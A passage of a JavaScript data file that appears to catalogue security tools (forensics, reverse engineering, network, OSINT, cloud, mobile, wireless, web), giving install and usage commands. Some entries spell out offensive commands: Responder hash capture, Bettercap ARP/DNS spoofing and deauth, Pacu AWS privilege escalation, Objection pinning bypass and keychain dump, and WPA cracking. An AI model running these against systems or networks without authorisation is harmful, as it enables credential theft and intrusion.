      { flag: "Hash Lookup", desc: "NSRL/custom hash databases" },
      { flag: "Keyword Search", desc: "Full-text indexing and search" },
      { flag: "Web Artifacts", desc: "Browser history, cookies, downloads" },
      { flag: "Email Parser", desc: "MBOX/PST email analysis" }
    ],
    outputFormat: "HTML reports, CSV, Excel",
    integrations: ["The Sleuth Kit", "YARA", "PhotoRec"],
    url: "https://www.autopsy.com"
  },
  {
    name: "The Sleuth Kit (TSK)",
    category: "forensics",
    description: "Command-line tools for disk image forensics — file system analysis (NTFS, FAT, ext, HFS+, APFS), file carving, and timeline creation",
    install: "sudo apt install sleuthkit",
    usage: [
      "mmls disk.img",
      "fls -r -m / -o 2048 disk.img",
      "icat disk.img 12345 > recovered_file.doc"
    ],
    advancedFlags: [
      { flag: "mmls", desc: "Display partition layout" },
      { flag: "fls", desc: "List files and directories (including deleted)" },
      { flag: "icat", desc: "Extract file by inode number" },
      { flag: "ffind", desc: "Find filename for inode" },
      { flag: "blkcat", desc: "Display contents of disk blocks" },
      { flag: "mactime", desc: "Create timeline from fls output" }
    ],
    outputFormat: "text, bodyfile (timeline format)",
    integrations: ["Autopsy", "YARA"],
    url: "https://www.sleuthkit.org"
  },
  {
    name: "Foremost",
    category: "forensics",
    description: "File carving tool — recover files from disk images or raw data based on headers, footers, and data structures",
    install: "sudo apt install foremost",
    usage: [
      "foremost -i disk.img -o recovered/",
      "foremost -t jpg,png,pdf,doc -i disk.img"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Input file/device" },
      { flag: "-o", desc: "Output directory" },
      { flag: "-t", desc: "File types to recover" },
      { flag: "-q", desc: "Quick mode (512-byte aligned)" },
      { flag: "-v", desc: "Verbose output" }
    ],
    outputFormat: "recovered files in typed directories, audit.txt report",
    integrations: ["Autopsy", "The Sleuth Kit"],
    url: "https://foremost.sourceforge.net"
  },
  {
    name: "Binwalk",
    category: "forensics",
    description: "Firmware analysis and extraction tool — identify embedded file systems, compressed archives, and executables within binary files",
    install: "sudo apt install binwalk",
    usage: [
      "binwalk firmware.bin",
      "binwalk -e firmware.bin",
      "binwalk --entropy firmware.bin"
    ],
    advancedFlags: [
      { flag: "-e", desc: "Extract identified files" },
      { flag: "--entropy", desc: "Calculate and graph entropy" },
      { flag: "-A", desc: "Scan for opcode signatures" },
      { flag: "-R", desc: "Search for raw string/bytes" },
      { flag: "--dd", desc: "Custom extraction rules" },
      { flag: "-M", desc: "Recursively extract" }
    ],
    outputFormat: "text, extracted files, entropy graphs",
    integrations: ["QEMU (for emulation)", "Ghidra", "IDA Pro"],
    url: "https://github.com/ReFirmLabs/binwalk"
  },
  {
    name: "KAPE",
    category: "forensics",
    description: "Kroll Artifact Parser and Extractor — triage collection and processing tool for Windows forensics. Targets 300+ artifact types",
    install: "Download from https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape",
    usage: [
      "kape.exe --tsource C: --tdest D:\\evidence --target KapeTriage",
      "kape.exe --msource D:\\evidence --mdest D:\\processed --module EZParser"
    ],
    advancedFlags: [
      { flag: "--tsource", desc: "Source drive/path for collection" },
      { flag: "--tdest", desc: "Destination for collected artifacts" },
      { flag: "--target", desc: "Target configuration (KapeTriage, RegistryHives, EventLogs)" },
      { flag: "--msource", desc: "Source for processing modules" },
      { flag: "--mdest", desc: "Destination for processed output" },
      { flag: "--module", desc: "Processing module (EZParser, RegRipper)" }
    ],
    outputFormat: "collected artifacts, CSV/HTML/JSON processed output",
    integrations: ["Timeline Explorer", "Registry Explorer", "EZTools"],
    url: "https://www.kroll.com/kape"
  },

  // ═══════════════════════════════════════════════════════════
  // REVERSE ENGINEERING
  // ═══════════════════════════════════════════════════════════
  {
    name: "Ghidra",
    category: "reverse-engineering",
    description: "NSA's open-source reverse engineering suite — disassembler, decompiler, graph views, scripting, collaborative analysis for x86/ARM/MIPS/PPC",
    install: "Download from https://ghidra-sre.org",
    usage: [
      "ghidraRun",
      "analyzeHeadless /project ProjectName -import binary -postScript script.py"
    ],
    advancedFlags: [
      { flag: "CodeBrowser", desc: "Main analysis window" },
      { flag: "Decompiler", desc: "Pseudo-C decompilation" },
      { flag: "Function Graph", desc: "Control flow graph visualization" },
      { flag: "Scripting", desc: "Python/Java analysis scripts" },
      { flag: "Version Tracking", desc: "Compare binary versions" },
      { flag: "Collaborative", desc: "Multi-user analysis via Ghidra Server" }
    ],
    outputFormat: "Ghidra project files, exported C/disassembly",
    integrations: ["YARA", "Binary Ninja (via plugins)", "VirusTotal"],
    url: "https://ghidra-sre.org"
  },
  {
    name: "IDA Pro",
    category: "reverse-engineering",
    description: "Industry-standard interactive disassembler and decompiler. Deep analysis of x86, x64, ARM, MIPS, and embedded architectures",
    install: "Commercial license from hex-rays.com (IDA Free available)",
    usage: [
      "ida64 binary.exe",
      "Analyze > Auto analysis > Wait for completion",
      "View > Open subviews > Pseudocode (F5)"
    ],
    advancedFlags: [
      { flag: "F5", desc: "Decompile function to C pseudocode" },
      { flag: "IDAPython", desc: "Python scripting interface" },
      { flag: "FLIRT", desc: "Library function recognition" },
      { flag: "Lumina", desc: "Collaborative function naming" },
      { flag: "Remote debugging", desc: "Debug binaries on remote systems" }
    ],
    outputFormat: "IDB database, ASM/C export, LST listing",
    integrations: ["x64dbg", "WinDbg", "Binary Ninja", "Ghidra"],
    url: "https://hex-rays.com/ida-pro"
  },
  {
    name: "Radare2 / Rizin",
    category: "reverse-engineering",
    description: "Open-source reverse engineering framework with CLI interface — disassembly, debugging, patching, binary diffing, and emulation",
    install: "sudo apt install radare2",
    usage: [
      "r2 -A binary",
      "r2 -d binary (debug mode)",
      "aaa; afl; pdf @ main"
    ],
    advancedFlags: [
      { flag: "aaa", desc: "Analyze all (functions, references, strings)" },
      { flag: "afl", desc: "List all functions" },
      { flag: "pdf", desc: "Print disassembly of function" },
      { flag: "VV", desc: "Visual mode with graph" },
      { flag: "iz", desc: "List strings in data sections" },
      { flag: "px", desc: "Hex dump" },
      { flag: "/", desc: "Search (bytes, strings, ROP gadgets)" },
      { flag: "wa", desc: "Write assembly at current offset" }
    ],
    outputFormat: "console, JSON (j suffix), DOT graphs",
    integrations: ["Cutter (GUI)", "r2ghidra (decompiler)", "r2frida"],
    url: "https://rada.re/n/radare2.html"
  },
  {
    name: "Binary Ninja",
    category: "reverse-engineering",
    description: "Modern reverse engineering platform with BNIL intermediate language, type inference, and extensive plugin ecosystem",
    install: "Commercial license from binary.ninja (Cloud version free)",
    usage: [
      "binaryninja binary.exe",
      "Open > Select binary > Wait for analysis"
    ],
    advancedFlags: [
      { flag: "HLIL", desc: "High Level IL (C-like decompilation)" },
      { flag: "MLIL", desc: "Medium Level IL" },
      { flag: "LLIL", desc: "Low Level IL" },
      { flag: "Type Library", desc: "Apply known structure types" },
      { flag: "Plugins", desc: "Extensible via Python plugins" }
    ],
    outputFormat: "BNDB database, C/disassembly export",
    integrations: ["Ghidra", "IDA (via plugins)", "Debuggers"],
    url: "https://binary.ninja"
  },
  {
    name: "x64dbg",
    category: "reverse-engineering",
    description: "Open-source x64/x32 debugger for Windows — GUI, plugin support, scripting, conditional breakpoints, and trace recording",
    install: "Download from https://x64dbg.com",
    usage: [
      "x96dbg.exe (launcher for both 32 and 64 bit)",
      "File > Open > Select executable"
    ],
    advancedFlags: [
      { flag: "F9", desc: "Run" },
      { flag: "F7", desc: "Step into" },
      { flag: "F8", desc: "Step over" },
      { flag: "Ctrl+G", desc: "Go to address" },
      { flag: "bp", desc: "Set breakpoint" },
      { flag: "SetBPX", desc: "Set breakpoint on export" }
    ],
    outputFormat: "x64dbg database, trace files",
    integrations: ["Ghidra", "IDA Pro", "ScyllaHide (anti-anti-debug)"],
    url: "https://x64dbg.com"
  },
  {
    name: "Frida",
    category: "reverse-engineering",
    description: "Dynamic instrumentation toolkit — inject JavaScript into native apps on Windows, macOS, Linux, iOS, Android, and QNX for runtime analysis",
    install: "pip install frida-tools",
    usage: [
      "frida -U -f com.app.target -l script.js",
      "frida-trace -U -f com.app.target -i 'open*'"
    ],
    advancedFlags: [
      { flag: "-U", desc: "Connect via USB" },
      { flag: "-f", desc: "Spawn process" },
      { flag: "-l", desc: "Load script" },
      { flag: "Interceptor.attach", desc: "Hook native function" },
      { flag: "Java.perform", desc: "Hook Java methods (Android)" },
      { flag: "ObjC.classes", desc: "List Objective-C classes (iOS)" }
    ],
    outputFormat: "console output, custom script output",
    integrations: ["Objection", "r2frida", "Brida (Burp extension)"],
    url: "https://frida.re"
  },
  {
    name: "Objection",
    category: "reverse-engineering",
    description: "Runtime mobile exploration toolkit powered by Frida — SSL pinning bypass, root/jailbreak detection bypass, method hooking on iOS/Android",
    install: "pip install objection",
    usage: [
      "objection -g com.app.target explore",
      "android sslpinning disable",
      "ios keychain dump"
    ],
    advancedFlags: [
      { flag: "android sslpinning disable", desc: "Bypass SSL pinning" },
      { flag: "android root disable", desc: "Bypass root detection" },
      { flag: "ios keychain dump", desc: "Dump keychain items" },
      { flag: "ios sslpinning disable", desc: "Bypass SSL pinning on iOS" },
      { flag: "memory list modules", desc: "List loaded modules" },
      { flag: "android hooking", desc: "Hook Java methods" }
    ],
    outputFormat: "console output",
    integrations: ["Frida", "Burp Suite"],
    url: "https://github.com/sensepost/objection"
  },

  // ═══════════════════════════════════════════════════════════
  // NETWORK ANALYSIS
  // ═══════════════════════════════════════════════════════════
  {
    name: "Wireshark",
    category: "network-analysis",
    description: "The world's most popular network protocol analyzer — deep inspection of hundreds of protocols, live capture, and offline analysis with powerful display filters",
    install: "sudo apt install wireshark",
    usage: [
      "wireshark -i eth0",
      "wireshark -r capture.pcap",
      "tshark -i eth0 -w capture.pcap"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Capture interface" },
      { flag: "-r", desc: "Read capture file" },
      { flag: "-w", desc: "Write to file" },
      { flag: "-Y", desc: "Display filter" },
      { flag: "-T json", desc: "Output as JSON" },
      { flag: "Follow TCP/UDP/HTTP Stream", desc: "Reconstruct application data" },
      { flag: "Statistics > Conversations", desc: "Communication matrix" },
      { flag: "File > Export Objects", desc: "Extract transferred files" }
    ],
    outputFormat: "PCAP, PCAPNG, CSV, JSON, XML, plain text",
    integrations: ["tshark (CLI)", "tcpdump", "NetworkMiner"],
    url: "https://www.wireshark.org"
  },
  {
    name: "tcpdump",
    category: "network-analysis",
    description: "Command-line packet analyzer — capture and filter network traffic with BPF expressions. Available on virtually all Unix systems",
    install: "sudo apt install tcpdump",
    usage: [
      "tcpdump -i eth0 -w capture.pcap",
      "tcpdump -i eth0 port 80 -A",
      "tcpdump -r capture.pcap -n 'src host 192.168.1.105 and dst port 443'"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Interface" },
      { flag: "-w", desc: "Write to file" },
      { flag: "-r", desc: "Read from file" },
      { flag: "-n", desc: "Don't resolve hostnames" },
      { flag: "-A", desc: "ASCII output" },
      { flag: "-X", desc: "Hex + ASCII output" },
      { flag: "-c", desc: "Capture N packets" },
      { flag: "-s 0", desc: "Capture full packets" },
      { flag: "BPF filters", desc: "host, port, net, src, dst, and/or/not" }
    ],
    outputFormat: "console text, PCAP file",
    integrations: ["Wireshark", "Zeek", "Snort"],
    url: "https://www.tcpdump.org"
  },
  {
    name: "Responder",
    category: "network-analysis",
    description: "LLMNR, NBT-NS, and mDNS poisoner — intercept network name resolution requests to capture NTLMv2 hashes, WPAD proxy",
    install: "sudo apt install responder",
    usage: [
      "responder -I eth0 -dwPv",
      "responder -I eth0 --lm --disable-ess"
    ],
    advancedFlags: [
      { flag: "-I", desc: "Network interface" },
      { flag: "-d", desc: "Enable DHCP fingerprinting" },
      { flag: "-w", desc: "Start WPAD rogue proxy" },
      { flag: "-P", desc: "Force proxy authentication" },
      { flag: "-v", desc: "Verbose mode" },
      { flag: "--lm", desc: "Force LM hash downgrade" },
      { flag: "-A", desc: "Analyze mode (passive, no poisoning)" }
    ],
    outputFormat: "console text, logs/hashes in Responder/logs/",
    integrations: ["hashcat", "John the Ripper", "ntlmrelayx"],
    url: "https://github.com/lgandx/Responder"
  },
  {
    name: "Zeek (Bro)",
    category: "network-analysis",
    description: "Powerful network analysis framework — protocol analysis, file extraction, DNS logging, SSL certificate analysis, custom scripting",
    install: "sudo apt install zeek",
    usage: [
      "zeek -i eth0",
      "zeek -r capture.pcap",
      "cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Live capture interface" },
      { flag: "-r", desc: "Read PCAP file" },
      { flag: "-C", desc: "Disable checksum validation" },
      { flag: "conn.log", desc: "Connection summaries" },
      { flag: "dns.log", desc: "DNS queries and responses" },
      { flag: "http.log", desc: "HTTP requests/responses" },
      { flag: "ssl.log", desc: "SSL/TLS handshakes" },
      { flag: "files.log", desc: "Extracted files metadata" },
      { flag: "notice.log", desc: "Anomaly and threat detections" }
    ],
    outputFormat: "TSV log files, JSON (with @load LogAscii::use_json)",
    integrations: ["ELK Stack", "Splunk", "RITA", "AC-Hunter"],
    url: "https://zeek.org"
  },
  {
    name: "Bettercap",
    category: "network-analysis",
    description: "Swiss army knife for network attacks and monitoring — ARP spoofing, DNS spoofing, WiFi attacks, BLE, HID, and transparent proxying",
    install: "sudo apt install bettercap",
    usage: [
      "bettercap -iface eth0",
      "bettercap -iface wlan0mon -eval 'wifi.recon on'",
      "bettercap -caplet http-ui"
    ],
    advancedFlags: [
      { flag: "net.probe on", desc: "Active host discovery" },
      { flag: "net.sniff on", desc: "Packet sniffing" },
      { flag: "arp.spoof on", desc: "ARP cache poisoning" },
      { flag: "dns.spoof on", desc: "DNS spoofing" },
      { flag: "http.proxy on", desc: "HTTP transparent proxy" },
      { flag: "wifi.recon on", desc: "WiFi reconnaissance" },
      { flag: "wifi.deauth", desc: "WiFi deauthentication" },
      { flag: "ble.recon on", desc: "Bluetooth LE scanning" },
      { flag: "hid.recon on", desc: "Wireless HID device scanning" }
    ],
    outputFormat: "console, web UI, pcap files",
    integrations: ["Wireshark", "Hashcat", "Responder"],
    url: "https://www.bettercap.org"
  },
  {
    name: "NetworkMiner",
    category: "network-analysis",
    description: "Network forensic analysis tool — passive host identification, file extraction, image reconstruction, credential detection from PCAP",
    install: "sudo apt install mono-complete && download from netresec.com",
    usage: [
      "NetworkMiner capture.pcap",
      "File > Open > select PCAP"
    ],
    advancedFlags: [
      { flag: "Hosts tab", desc: "Identified hosts with OS fingerprinting" },
      { flag: "Files tab", desc: "Extracted files from streams" },
      { flag: "Images tab", desc: "Extracted images" },
      { flag: "Credentials tab", desc: "Captured credentials" },
      { flag: "Sessions tab", desc: "TCP session reconstruction" },
      { flag: "DNS tab", desc: "DNS query/response pairs" }
    ],
    outputFormat: "GUI output, extracted files",
    integrations: ["Wireshark", "Zeek"],
    url: "https://www.netresec.com/?page=NetworkMiner"
  },

  // ═══════════════════════════════════════════════════════════
  // OSINT
  // ═══════════════════════════════════════════════════════════
  {
    name: "theHarvester",
    category: "osint",
    description: "Gather emails, names, subdomains, IPs, and URLs from multiple public sources (Google, Bing, Shodan, Hunter, LinkedIn, etc.)",
    install: "pip install theHarvester",
    usage: [
      "theHarvester -d example.com -b all -l 500",
      "theHarvester -d example.com -b google,bing,linkedin -f report.html"
    ],
    advancedFlags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "-b", desc: "Data source (all, google, bing, shodan, hunter, linkedin)" },
      { flag: "-l", desc: "Limit results" },
      { flag: "-f", desc: "Output report file" },
      { flag: "-n", desc: "DNS brute-force" },
      { flag: "-t", desc: "TLD discovery" }
    ],
    outputFormat: "text, HTML, XML",
    integrations: ["Maltego", "SpiderFoot", "Recon-ng"],
    url: "https://github.com/laramies/theHarvester"
  },
  {
    name: "SpiderFoot",
    category: "osint",
    description: "Automated OSINT collection — 200+ modules for domains, IPs, emails, names, phone numbers, dark web, and more",
    install: "pip install spiderfoot",
    usage: [
      "spiderfoot -l 127.0.0.1:5001 (web UI)",
      "sfcli.py -s target.com -t all -o json > results.json"
    ],
    advancedFlags: [
      { flag: "-l", desc: "Web UI listen address" },
      { flag: "-s", desc: "Scan target" },
      { flag: "-t", desc: "Module types" },
      { flag: "-m", desc: "Specific modules" },
      { flag: "-o", desc: "Output format" }
    ],
    outputFormat: "web UI, JSON, CSV, GEXF (graph)",
    integrations: ["Maltego", "VirusTotal", "Shodan", "HaveIBeenPwned"],
    url: "https://github.com/smicallef/spiderfoot"
  },
  {
    name: "Maltego",
    category: "osint",
    description: "Visual link analysis and data mining tool — investigate relationships between people, companies, domains, IPs, files, and social networks",
    install: "Download from maltego.com (Community Edition free)",
    usage: [
      "Open Maltego > New Graph > Add entity > Run transforms"
    ],
    advancedFlags: [
      { flag: "Transforms", desc: "Data enrichment actions (DNS, WHOIS, social, etc.)" },
      { flag: "Machines", desc: "Automated transform sequences" },
      { flag: "Entities", desc: "Data types (person, domain, IP, email, etc.)" },
      { flag: "Hub", desc: "Third-party transform marketplace" }
    ],
    outputFormat: "Maltego graph files, CSV, Excel, PDF reports",
    integrations: ["Shodan", "VirusTotal", "HaveIBeenPwned", "PassiveTotal"],
    url: "https://www.maltego.com"
  },
  {
    name: "Recon-ng",
    category: "osint",
    description: "Web reconnaissance framework with modular architecture — similar to Metasploit but for OSINT. Database-backed result storage",
    install: "pip install recon-ng",
    usage: [
      "recon-ng",
      "marketplace search",
      "marketplace install all",
      "modules load recon/domains-hosts/hackertarget"
    ],
    advancedFlags: [
      { flag: "marketplace", desc: "Search/install modules" },
      { flag: "workspaces", desc: "Separate project databases" },
      { flag: "modules load", desc: "Load specific module" },
      { flag: "options set", desc: "Configure module options" },
      { flag: "run", desc: "Execute loaded module" },
      { flag: "show", desc: "Display collected data (hosts, contacts, etc.)" }
    ],
    outputFormat: "SQLite database, HTML, JSON, CSV, XLSX reports",
    integrations: ["Shodan", "VirusTotal", "BuiltWith", "Censys"],
    url: "https://github.com/lanmaster53/recon-ng"
  },
  {
    name: "Sherlock",
    category: "osint",
    description: "Hunt for social media accounts by username across 400+ platforms simultaneously",
    install: "pip install sherlock-project",
    usage: [
      "sherlock username",
      "sherlock username1 username2 --csv"
    ],
    advancedFlags: [
      { flag: "--csv", desc: "Output as CSV" },
      { flag: "--json", desc: "Output as JSON" },
      { flag: "--tor", desc: "Route through Tor" },
      { flag: "--proxy", desc: "Use proxy" },
      { flag: "--timeout", desc: "Request timeout" },
      { flag: "--site", desc: "Specific site to check" }
    ],
    outputFormat: "text, CSV, JSON, XLSX",
    integrations: ["SpiderFoot", "Maltego"],
    url: "https://github.com/sherlock-project/sherlock"
  },
  {
    name: "Shodan CLI",
    category: "osint",
    description: "Search engine for internet-connected devices — find servers, webcams, routers, ICS/SCADA systems by service banners, headers, and certificates",
    install: "pip install shodan",
    usage: [
      "shodan search 'apache country:US port:443'",
      "shodan host 8.8.8.8",
      "shodan stats --facets country apache"
    ],
    advancedFlags: [
      { flag: "search", desc: "Search Shodan database" },
      { flag: "host", desc: "Lookup specific IP" },
      { flag: "stats", desc: "Statistical summary" },
      { flag: "scan submit", desc: "Request on-demand scan" },
      { flag: "alert", desc: "Monitor IP ranges" },
      { flag: "domain", desc: "DNS information" },
      { flag: "download", desc: "Download search results" }
    ],
    outputFormat: "text, JSON",
    integrations: ["Nmap", "Metasploit", "Maltego"],
    url: "https://cli.shodan.io"
  },

  // ═══════════════════════════════════════════════════════════
  // CLOUD SECURITY
  // ═══════════════════════════════════════════════════════════
  {
    name: "ScoutSuite",
    category: "cloud-security",
    description: "Multi-cloud security auditing tool — generates HTML reports for AWS, Azure, GCP, Alibaba Cloud, Oracle Cloud with 500+ checks",
    install: "pip install scoutsuite",
    usage: [
      "scout aws --profile myprofile",
      "scout azure --cli",
      "scout gcp --service-account key.json"
    ],
    advancedFlags: [
      { flag: "aws/azure/gcp", desc: "Cloud provider" },
      { flag: "--profile", desc: "AWS credential profile" },
      { flag: "--regions", desc: "Specific regions to scan" },
      { flag: "--services", desc: "Specific services to audit" },
      { flag: "--ruleset", desc: "Custom rules file" }
    ],
    outputFormat: "interactive HTML report",
    integrations: ["AWS CLI", "Azure CLI", "gcloud CLI"],
    url: "https://github.com/nccgroup/ScoutSuite"
  },
  {
    name: "Prowler",
    category: "cloud-security",
    description: "AWS/Azure/GCP security assessment tool — 300+ checks covering CIS, PCI-DSS, HIPAA, GDPR, SOC2, NIST 800-53, and custom frameworks",
    install: "pip install prowler",
    usage: [
      "prowler aws",
      "prowler aws --compliance cis_2.0_aws",
      "prowler azure --subscription-ids <sub-id>"
    ],
    advancedFlags: [
      { flag: "aws/azure/gcp", desc: "Cloud provider" },
      { flag: "--compliance", desc: "Compliance framework to check" },
      { flag: "--severity", desc: "Filter by severity" },
      { flag: "--checks", desc: "Specific checks to run" },
      { flag: "--services", desc: "Specific services to audit" },
      { flag: "-M", desc: "Output mode (json, csv, html)" }
    ],
    outputFormat: "JSON, CSV, HTML, OCSF",
    integrations: ["Security Hub", "S3", "Elasticsearch"],
    url: "https://github.com/prowler-cloud/prowler"
  },
  {
    name: "Pacu",
    category: "cloud-security",
    description: "AWS exploitation framework — credential enumeration, privilege escalation, data exfiltration, persistence, and lateral movement",
    install: "pip install pacu",
    usage: [
      "pacu",
      "import_keys --all",
      "run iam__enum_permissions",
      "run iam__privesc_scan"
    ],
    advancedFlags: [
      { flag: "import_keys", desc: "Import AWS credentials" },
      { flag: "run", desc: "Execute module" },
      { flag: "iam__enum_permissions", desc: "Enumerate IAM permissions" },
      { flag: "iam__privesc_scan", desc: "Find privilege escalation paths" },
      { flag: "ec2__enum", desc: "Enumerate EC2 instances" },
      { flag: "s3__enum", desc: "Enumerate S3 buckets" },
      { flag: "lambda__enum", desc: "Enumerate Lambda functions" }
    ],
    outputFormat: "console text, session database",
    integrations: ["AWS CLI", "ScoutSuite"],
    url: "https://github.com/RhinoSecurityLabs/pacu"
  },
  {
    name: "CloudSploit",
    category: "cloud-security",
    description: "Cloud security posture management — 400+ configuration checks for AWS, Azure, GCP, and Oracle Cloud",
    install: "git clone https://github.com/aquasecurity/cloudsploit && npm install",
    usage: [
      "node index.js --cloud aws --config config.js",
      "node index.js --cloud aws --compliance cis"
    ],
    advancedFlags: [
      { flag: "--cloud", desc: "Cloud provider" },
      { flag: "--config", desc: "Configuration file" },
      { flag: "--compliance", desc: "Compliance benchmark" },
      { flag: "--plugin", desc: "Specific plugin to run" },
      { flag: "--csv", desc: "CSV output" },
      { flag: "--json", desc: "JSON output" }
    ],
    outputFormat: "console text, CSV, JSON, JUnit XML",
    integrations: ["Aqua Security", "CI/CD pipelines"],
    url: "https://github.com/aquasecurity/cloudsploit"
  },
  {
    name: "Trivy",
    category: "cloud-security",
    description: "Comprehensive security scanner — container images, filesystems, git repos, Kubernetes, Terraform, CloudFormation for vulnerabilities and misconfigurations",
    install: "sudo apt install trivy",
    usage: [
      "trivy image nginx:latest",
      "trivy fs --security-checks vuln,secret,config .",
      "trivy k8s --report summary cluster"
    ],
    advancedFlags: [
      { flag: "image", desc: "Scan container image" },
      { flag: "fs", desc: "Scan filesystem" },
      { flag: "repo", desc: "Scan git repository" },
      { flag: "k8s", desc: "Scan Kubernetes cluster" },
      { flag: "config", desc: "Scan IaC files" },
      { flag: "--severity", desc: "Filter by severity" },
      { flag: "--ignore-unfixed", desc: "Skip vulnerabilities without fix" },
      { flag: "-f json", desc: "JSON output format" }
    ],
    outputFormat: "table, JSON, SARIF, CycloneDX, SPDX",
    integrations: ["Docker", "Kubernetes", "GitHub Actions", "GitLab CI"],
    url: "https://github.com/aquasecurity/trivy"
  },

  // ═══════════════════════════════════════════════════════════
  // MOBILE SECURITY
  // ═══════════════════════════════════════════════════════════
  {
    name: "MobSF",
    category: "mobile-security",
    description: "Mobile Security Framework — automated static and dynamic analysis for Android APK, iOS IPA, and Windows app files",
    install: "docker pull opensecurity/mobile-security-framework-mobsf && docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf",
    usage: [
      "Access web UI at http://localhost:8000",
      "Upload APK/IPA for analysis"
    ],
    advancedFlags: [
      { flag: "Static Analysis", desc: "Code review, manifest parsing, permissions, libraries" },
      { flag: "Dynamic Analysis", desc: "Runtime testing, API monitoring, network capture" },
      { flag: "Malware Analysis", desc: "Domain, IP, URL reputation checks" },
      { flag: "REST API", desc: "/api/v1/scan, /api/v1/report_json" }
    ],
    outputFormat: "web report, JSON, PDF",
    integrations: ["Frida", "Objection", "Genymotion"],
    url: "https://github.com/MobSF/Mobile-Security-Framework-MobSF"
  },
  {
    name: "apktool",
    category: "mobile-security",
    description: "Reverse engineer Android APK files — decode resources, disassemble smali code, and rebuild modified APKs",
    install: "sudo apt install apktool",
    usage: [
      "apktool d app.apk -o decompiled/",
      "apktool b decompiled/ -o modified.apk"
    ],
    advancedFlags: [
      { flag: "d", desc: "Decode APK" },
      { flag: "b", desc: "Build APK from decoded directory" },
      { flag: "-r", desc: "Don't decode resources" },
      { flag: "-s", desc: "Don't disassemble dex to smali" },
      { flag: "-f", desc: "Force overwrite output directory" }
    ],
    outputFormat: "smali code, decoded XML resources",
    integrations: ["jadx (Java decompiler)", "jarsigner", "zipalign"],
    url: "https://apktool.org"
  },
  {
    name: "jadx",
    category: "mobile-security",
    description: "DEX to Java decompiler — convert Android APK/DEX files to readable Java source code with GUI and CLI",
    install: "sudo apt install jadx",
    usage: [
      "jadx-gui app.apk",
      "jadx -d output/ app.apk"
    ],
    advancedFlags: [
      { flag: "-d", desc: "Output directory" },
      { flag: "--deobf", desc: "Enable deobfuscation" },
      { flag: "--show-bad-code", desc: "Show code even with errors" },
      { flag: "-e", desc: "Export Gradle project" },
      { flag: "--threads-count", desc: "Processing threads" }
    ],
    outputFormat: "Java source files, Gradle project",
    integrations: ["apktool", "MobSF", "Android Studio"],
    url: "https://github.com/skylot/jadx"
  },

  // ═══════════════════════════════════════════════════════════
  // WIRELESS
  // ═══════════════════════════════════════════════════════════
  {
    name: "Aircrack-ng",
    category: "wireless",
    description: "Complete WiFi security auditing suite — monitor mode, packet injection, WEP/WPA/WPA2 cracking, deauthentication attacks",
    install: "sudo apt install aircrack-ng",
    usage: [
      "airmon-ng start wlan0",
      "airodump-ng wlan0mon",
      "airodump-ng -c 6 --bssid <AP_MAC> -w capture wlan0mon",
      "aircrack-ng -w rockyou.txt capture-01.cap"
    ],
    advancedFlags: [
      { flag: "airmon-ng", desc: "Manage monitor mode" },
      { flag: "airodump-ng", desc: "Packet capture and AP discovery" },
      { flag: "aireplay-ng", desc: "Packet injection (deauth, fake auth, etc.)" },
      { flag: "aircrack-ng", desc: "WEP/WPA key cracking" },
      { flag: "airdecap-ng", desc: "Decrypt WEP/WPA capture files" },
      { flag: "airbase-ng", desc: "Create rogue access point" }
    ],
    outputFormat: "PCAP capture files, cracked keys in console",
    integrations: ["Hashcat", "John the Ripper", "Wireshark"],
    url: "https://www.aircrack-ng.org"
  },
  {
    name: "Wifite",
    category: "wireless",
    description: "Automated wireless attack tool — handles monitor mode, scanning, deauth, handshake capture, and cracking in one workflow",
    install: "sudo apt install wifite",
    usage: [
      "wifite --wpa --dict /usr/share/wordlists/rockyou.txt",
      "wifite --kill --skip-crack"
    ],
    advancedFlags: [
      { flag: "--wpa", desc: "Target WPA networks only" },
      { flag: "--wep", desc: "Target WEP networks only" },
      { flag: "--dict", desc: "Wordlist for cracking" },
      { flag: "--kill", desc: "Kill conflicting processes" },
      { flag: "--skip-crack", desc: "Capture only, crack later" },
      { flag: "--num-deauths", desc: "Deauth packets to send" }
    ],
    outputFormat: "console text, captured handshake files (.cap)",
    integrations: ["aircrack-ng", "hashcat", "pyrit", "tshark"],
    url: "https://github.com/derv82/wifite2"
  },
  {
    name: "Kismet",
    category: "wireless",
    description: "Wireless network detector, sniffer, wardriving tool, and WIDS framework — supports WiFi, Bluetooth, SDR, and more",
    install: "sudo apt install kismet",
    usage: [
      "kismet -c wlan0",
      "kismet --override wardrive"
    ],
    advancedFlags: [
      { flag: "-c", desc: "Capture source" },
      { flag: "--override", desc: "Override config type" },
      { flag: "REST API", desc: "http://localhost:2501 for programmatic access" },
      { flag: "Alerts", desc: "WIDS alert framework" }
    ],
    outputFormat: "SQLite database (.kismet), PCAP, KML (wardriving)",
    integrations: ["Wireshark", "Google Earth (KML)", "Aircrack-ng"],
    url: "https://www.kismetwireless.net"
  },

  // ═══════════════════════════════════════════════════════════
  // WEB APPLICATION TESTING
  // ═══════════════════════════════════════════════════════════
  {
    name: "Burp Suite",
    category: "web",
    description: "Industry-standard web application security testing platform — intercepting proxy, scanner, repeater, intruder, collaborator, and extensibility",
    install: "Download from portswigger.net (Community Edition free)",
    usage: [
      "Configure browser proxy to 127.0.0.1:8080",
      "Proxy > Intercept > capture and modify requests",
      "Scanner > Active scan target"
    ],
    advancedFlags: [
      { flag: "Proxy", desc: "Intercept and modify HTTP/S traffic" },
      { flag: "Repeater", desc: "Manual request modification and replay" },
      { flag: "Intruder", desc: "Automated fuzzing and brute-force" },
      { flag: "Scanner", desc: "Automated vulnerability detection (Pro)" },
      { flag: "Collaborator", desc: "Out-of-band interaction server (Pro)" },
      { flag: "Sequencer", desc: "Token randomness analysis" },
      { flag: "Decoder", desc: "Encode/decode data transforms" },
      { flag: "Comparer", desc: "Visual diff of requests/responses" },
      { flag: "Extensions", desc: "BApp Store plugins" }
    ],
    outputFormat: "XML, HTML, JSON reports (Pro)",
    integrations: ["sqlmap", "ffuf", "Nuclei", "Autorize (extension)"],
    url: "https://portswigger.net/burp"
  },
  {
    name: "OWASP ZAP",
    category: "web",
    description: "Free and open-source web application security scanner — proxy, active/passive scanning, fuzzing, spidering, and API testing",
    install: "sudo apt install zaproxy",
    usage: [
      "zap.sh -daemon -port 8080",
      "zap-cli quick-scan https://target.com",
